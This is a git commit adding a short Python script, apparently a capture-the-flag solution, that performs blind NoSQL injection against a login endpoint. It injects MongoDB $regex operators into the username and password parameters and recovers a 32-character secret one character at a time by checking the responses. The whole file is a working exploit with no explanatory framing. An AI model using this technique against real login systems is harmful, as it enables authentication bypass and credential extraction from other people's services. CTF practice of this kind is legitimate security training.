fcfc28cd59eaaaef00a4299f68141ae6ae9a35f6
w4ynott <102636722+w4ynott@users.noreply.github.com>
2022-03-30 11:25:20 +0900

    Create mongo-sql-injection-with-regex.py

---
+++ mongo-sql-injection-with-regex.py
@@ -0,0 +1,17 @@
+#!/usr/bin/python3
+
+import requests, string
+
+HOST =  'http://127.0.0.1:8000'
+ALPHANUMRIC = string.digits + string.ascii_letters
+SUCCESS_TEXT = 'admin'
+FLAG = ''
+lengthOfResult = 32
+
+for i in range(lengthOfResult):
+    for c in ALPHANUMRIC:
+        response = requests.get(f'{HOST}/login?uid[$regex]=ad..n&upw[$regex]=D.{{{FLAG}{c}')
+        if response.text == SUCCESS_TEXT:
+            FLAG += c
+            break
+    print(f'DH{{{FLAG}}}')
